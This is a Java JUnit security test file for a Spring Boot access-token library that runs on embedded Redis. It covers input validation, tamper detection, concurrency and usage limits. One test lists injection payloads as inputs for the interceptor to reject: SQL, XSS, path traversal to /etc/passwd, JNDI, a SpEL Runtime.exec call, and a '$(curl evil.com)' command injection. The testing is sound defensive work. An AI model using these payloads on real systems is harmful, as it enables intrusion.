package fun.commons.framework4j.accesstoken;

import fun.commons.framework4j.accesstoken.annotation.RequiresToken;
import fun.commons.framework4j.accesstoken.context.TokenContext;
import fun.commons.framework4j.accesstoken.core.AccessTokenGenerator;
import fun.commons.framework4j.accesstoken.exception.AuthException;
import fun.commons.framework4j.accesstoken.interceptor.TokenInterceptor;
import jakarta.annotation.Resource;
import lombok.extern.slf4j.Slf4j;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.mockito.Mock;
import org.mockito.Mockito;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.web.method.HandlerMethod;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import java.util.Map;
import java.util.Set;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

import static org.junit.jupiter.api.Assertions.*;

/**
 * AccessToken 内存Redis安全测试
 *
 * 验证各种边界条件、安全场景和异常情况下的行为
 */
@Slf4j
@SpringBootTest
@ActiveProfiles("embedded-redis")
class EmbeddedRedisSecurityTest {

    @Resource
    private AccessTokenGenerator generator;

    @Resource
    private TokenInterceptor interceptor;

    @Resource
    private StringRedisTemplate stringRedisTemplate;

    @Mock
    private HandlerMethod handlerMethod;

    @SpringBootApplication
    static class TestApplication {}

    @BeforeEach
    void setUp() {
        cleanRedisData();
    }

    @AfterEach
    void tearDown() {
        cleanRedisData();
        TokenContext.clear();
    }

    private void cleanRedisData() {
        // v2.1 P0 修复：补清 access:revoked + refresh:family + refresh:revoked 残留
        String[] patterns = {
                "accesstoken-embedded-test:*",
                "access:revoked:accesstoken-embedded-test",
                "refresh:family:accesstoken-embedded-test:*",
                "refresh:revoked:accesstoken-embedded-test:*"
        };
        for (String pattern : patterns) {
            Set<String> keys = stringRedisTemplate.keys(pattern);
            if (keys != null && !keys.isEmpty()) {
                stringRedisTemplate.delete(keys);
            }
        }
    }

    // ==================== 输入验证测试 ====================

    @Test
    @DisplayName("空Token类型测试")
    void testEmptyTokenType() {
        AuthException exception = assertThrows(AuthException.class,
            () -> generator.generateToken("", Map.of("uid", "test")));

        assertEquals(10200, exception.getCode()); // 无效参数
    }

    @Test
    @DisplayName("null Claims测试")
    void testNullClaims() {
        AuthException exception = assertThrows(AuthException.class,
            () -> generator.generateToken("WEB", null));

        assertEquals(10200, exception.getCode()); // 无效参数
    }

    @Test
    @DisplayName("空Claims测试")
    void testEmptyClaims() throws Exception {
        String token = generator.generateToken("WEB", Map.of("uid", "empty-claims-user"));
        assertNotNull(token);

        // 空claims应该也能验证成功
        assertTrue(mockInterceptorCall(token, "WEB"));
    }

    @Test
    @DisplayName("超长Token类型测试")
    void testLongTokenType() {
        String longType = "A".repeat(1000); // 1000字符的类型名

        AuthException exception = assertThrows(AuthException.class,
            () -> generator.generateToken(longType, Map.of("uid", "test")));

        assertEquals(10200, exception.getCode()); // 无效参数
    }

    // ==================== 注入攻击防护测试 ====================

    @Test
    @DisplayName("恶意Header注入测试")
    void testMaliciousHeaderInjection() throws Exception {
        // 尝试各种注入攻击
        String[] maliciousHeaders = {
            "Bearer \n\r\t", // 换行符注入
            "Bearer ' OR 1=1 --", // SQL注入尝试
            "Bearer <script>alert('xss')</script>", // XSS尝试
            "Bearer ../../../etc/passwd", // 路径遍历
            "Bearer ${jndi:ldap://}", // JNDI注入
            "Bearer #{T(java.lang.Runtime).getRuntime().exec('calc')}", // SPEL注入
            "Bearer $(curl evil.com)", // 命令注入
        };

        for (String header : maliciousHeaders) {
            MockHttpServletRequest request = new MockHttpServletRequest();
            request.addHeader("Authorization", header);
            MockHttpServletResponse response = new MockHttpServletResponse();

            // 应该被拒绝或安全处理
            try {
                RequiresToken annotation = Mockito.mock(RequiresToken.class);
                Mockito.when(annotation.value()).thenReturn("WEB");
                Mockito.doReturn(AuthException.class).when(annotation).exception();
                Mockito.when(handlerMethod.getMethodAnnotation(RequiresToken.class)).thenReturn(annotation);

                boolean result = interceptor.preHandle(request, response, handlerMethod);
                assertFalse(result, "恶意header应该被拒绝: " + header);
            } catch (AuthException e) {
                // 预期异常 - 10200(未提供) / 10202(签名错) / 10207(格式错)
                assertTrue(e.getCode() == 10200 || e.getCode() == 10202 || e.getCode() == 10207,
                    "错误码应该是 10200/10202/10207，实际: " + e.getCode());
            }
        }
    }

    @Test
    @DisplayName("Token篡改检测测试")
    void testTokenTamperingDetection() {
        Map<String, Object> claims = Map.of("uid", "tamper-test");
        String originalToken = generator.generateToken("WEB", claims);

        // 尝试修改Token
        String tamperedToken = originalToken.substring(0, 10) + "X" + originalToken.substring(11);

        AuthException exception = assertThrows(AuthException.class,
            () -> mockInterceptorCall(tamperedToken, "WEB"));

        assertEquals(10202, exception.getCode()); // 令牌签名无效
    }

    // ==================== 并发安全测试 ====================

    @Test
    @DisplayName("并发单点登录测试")
    void testConcurrentSingleSignOn() throws InterruptedException {
        String uid = "concurrent-sso-user";
        int threadCount = 20;
        ExecutorService executor = Executors.newFixedThreadPool(threadCount);
        CountDownLatch latch = new CountDownLatch(threadCount);
        AtomicInteger generatedTokens = new AtomicInteger(0);
        AtomicInteger validTokens = new AtomicInteger(0);

        // 多个线程同时生成Token（单点登录策略）
        for (int i = 0; i < threadCount; i++) {
            executor.submit(() -> {
                try {
                    String token = generator.generateToken("ADMIN", Map.of("uid", uid));
                    generatedTokens.incrementAndGet();

                    // 尝试验证Token
                    try {
                        if (mockInterceptorCall(token, "ADMIN")) {
                            validTokens.incrementAndGet();
                        }
                    } catch (Exception e) {
                        // 预期部分Token会被踢掉
                        if (e instanceof AuthException authException) {
                            int code = authException.getCode();
                            if (code != 10205) { // 10205是账号已在别处登录
                                log.info("Unexpected error code: " + code + ", message: " + authException.getMessage());
                                throw new RuntimeException(e);
                            }
                        } else {
                            log.info("Unexpected exception: " + e.getClass().getSimpleName() + ", message: " + e.getMessage());
                            throw new RuntimeException(e);
                        }
                    }
                } finally {
                    latch.countDown();
                }
            });
        }

        // v2.1 P0 修复：断言 latch.await 返回值，超时则测试失败
        assertTrue(latch.await(15, TimeUnit.SECONDS),
                "所有线程应在 15s 内完成，可能超时");
        executor.shutdown();
        if (!executor.awaitTermination(5, java.util.concurrent.TimeUnit.SECONDS)) {
            executor.shutdownNow();
        }
        log.info("=== 并发单点登录结果 ===");
        log.info("线程数: " + threadCount);
        log.info("生成Token数: " + generatedTokens.get());
        log.info("有效Token数: " + validTokens.get());

        // 单点登录：最终只能有一个Token有效
        assertEquals(1, validTokens.get(), "并发单点登录应该只保留一个有效Token");
        assertEquals(threadCount, generatedTokens.get(), "所有Token都应该生成成功");
    }

    @Test
    @DisplayName("并发一次性Token原子性测试")
    void testConcurrentSingleUseAtomicity() throws InterruptedException {
        String uid = "atomic-test-user";
        String token = generator.generateToken("RESET", Map.of("uid", uid, "type", "password")); // max-usage=1

        int threadCount = 50;
        ExecutorService executor = Executors.newFixedThreadPool(threadCount);
        CountDownLatch latch = new CountDownLatch(threadCount);
        AtomicInteger successCount = new AtomicInteger(0);
        AtomicInteger failureCount = new AtomicInteger(0);

        // 多线程同时验证一次性Token
        for (int i = 0; i < threadCount; i++) {
            executor.submit(() -> {
                try {
                    if (mockInterceptorCall(token, "RESET")) {
                        successCount.incrementAndGet();
                    }
                } catch (Exception e) {
                    if (e instanceof AuthException && ((AuthException) e).getCode() == 10201) { // 次数超限
                        failureCount.incrementAndGet();
                    } else {
                        throw new RuntimeException(e);
                    }
                } finally {
                    latch.countDown();
                }
            });
        }

        // v2.1 P0 修复：断言 latch.await 返回值
        assertTrue(latch.await(15, TimeUnit.SECONDS),
                "所有线程应在 15s 内完成，可能超时");
        executor.shutdown();
        if (!executor.awaitTermination(5, java.util.concurrent.TimeUnit.SECONDS)) {
            executor.shutdownNow();
        }
        log.info("=== 并发一次性Token结果 ===");
        log.info("线程数: " + threadCount);
        log.info("成功数: " + successCount.get());
        log.info("失败数: " + failureCount.get());

        // 原子性：只能有一个成功
        assertEquals(1, successCount.get(), "一次性Token只能验证成功一次");
        assertEquals(threadCount - 1, failureCount.get(), "其余请求都应该失败");
    }

    // ==================== 容量限制测试 ====================

    @Test
    @DisplayName("APP策略使用次数限制测试")
    void testAppPolicyMaxUsageLimit() throws Exception {
        String uid = "max-usage-user";
        String deviceId = "device-001";

        // 生成一个Token（max-usage=100）
        String token = generator.generateToken("APP", Map.of("uid", uid, "deviceId", deviceId));

        // 验证max-usage=100的限制 - 使用100次应该成功
        for (int i = 0; i < 100; i++) {
            assertTrue(mockInterceptorCall(token, "APP"), "第" + (i + 1) + "次使用应该成功");
        }

        // 第101次使用应该失败
        AuthException exception = assertThrows(AuthException.class,
            () -> mockInterceptorCall(token, "APP"));

        assertEquals(10201, exception.getCode()); // 使用次数超限
    }

    @Test
    @DisplayName("Token大小限制测试")
    void testTokenSizeLimit() throws Exception {
        // 测试超大claims
        StringBuilder hugeClaims = new StringBuilder();
        for (int i = 0; i < 10000; i++) {
            hugeClaims.append("data").append(i).append("=");
        }

        Map<String, Object> claims = Map.of("uid", "huge-test", "data", hugeClaims.toString());

        // 应该能处理（但可能有性能影响）
        String token = generator.generateToken("WEB", claims);
        assertNotNull(token);

        // 验证大Token
        assertTrue(mockInterceptorCall(token, "WEB"), "大Token应该能正常验证");
    }

    // ==================== 时间相关测试 ====================
    // v2.1 P0 修复：删除两个被注释的 @Test 死代码方法
    // - testTokenExpirationAccuracy：依赖 Thread.sleep(65s)，flaky 且拖慢 CI
    // - testClockSkewAttackProtection：依赖未实现的时钟回拨检测功能
    // 若未来实现时钟回拨检测或需要过期精确性测试，应改用 Awaitility + 短 TTL（≤2s）

    // ==================== 辅助方法 ====================

    private boolean mockInterceptorCall(String token, String requiredType) throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest();
        request.addHeader("Authorization", "Bearer " + token);
        MockHttpServletResponse response = new MockHttpServletResponse();

        // Mock注解
        RequiresToken annotation = Mockito.mock(RequiresToken.class);
        Mockito.when(annotation.value()).thenReturn(requiredType);
        Mockito.doReturn(AuthException.class).when(annotation).exception();
        Mockito.when(handlerMethod.getMethodAnnotation(RequiresToken.class)).thenReturn(annotation);

        return interceptor.preHandle(request, response, handlerMethod);
    }
}